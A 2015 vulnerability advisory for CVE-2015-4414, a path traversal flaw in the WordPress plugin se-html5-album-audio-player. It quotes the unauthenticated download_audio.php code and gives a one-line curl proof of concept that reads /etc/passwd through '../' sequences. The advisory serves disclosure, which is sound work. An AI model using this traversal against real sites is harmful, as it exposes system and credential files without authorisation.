Author: Larry W. Cashdollar, @_larry0
Date: 2015-06-06
Advisory: http://www.vapid.dhs.org/advisory.php?v=124
Vendor Notified: 2015-06-06
Description: 

Vulnerability:


File ./se-html5-album-audio-player/download_audio.php:

3 $file_name = $_SERVER[&#039;DOCUMENT_ROOT&#039;] . $_GET[&#039;file&#039;];
4 $is_in_uploads_dir = strpos($file_name, &#039;/wp-content/uploads/&#039;);
5 // make sure it&#039;s a file before doing anything!
6 if( is_file($file_name) && $is_in_uploads_dir !== false ) {
7 
8         // required for IE
10     
11         // get the file mime type using the file extension
12         switch(strtolower(substr(strrchr($file_name, &#039;.&#039;), 1))) {
13                 case &#039;pdf&#039;: $mime = &#039;application/pdf&#039;; break;
14                 case &#039;zip&#039;: $mime = &#039;application/zip&#039;; break;
15                 case &#039;jpeg&#039;:
16                 case &#039;jpg&#039;: $mime = &#039;image/jpg&#039;; break;
17                 default: $mime = &#039;application/force-download&#039;;
18         }
19         header(&#039;Pragma: public&#039;);       // required
20         header(&#039;Expires: 0&#039;);           // no cache
22         header(&#039;Last-Modified: &#039;.gmdate (&#039;D, d M Y H:i:s&#039;, filemtime ($file_name)).&#039; GMT&#039;);
23         header(&#039;Cache-Control: private&#039;,false);
24         header(&#039;Content-Type: &#039;.$mime);
25         header(&#039;Content-Disposition: attachment; filename="&#039;.basename($file_name).&#039;"&#039;);
26         header(&#039;Content-Transfer-Encoding: binary&#039;);        
27         header(&#039;Content-Length: &#039;.filesize($file_name));        // provide file size
28         header(&#039;Connection: close&#039;);
29         readfile($file_name);           // push it out
30         exit();

The above code does not verify if a user is logged in, and do proper sanity checking if the file is outside of the uploads directory.

CVEID: 2015-4414
OSVDB:
Exploit Code:
  â€¢ $ curl http://www.vapidlabs.com/wp-content/plugins/se-html5-album-audio-player/download_audio.php?file=/wp-content/uploads/../../../../../etc/passwd

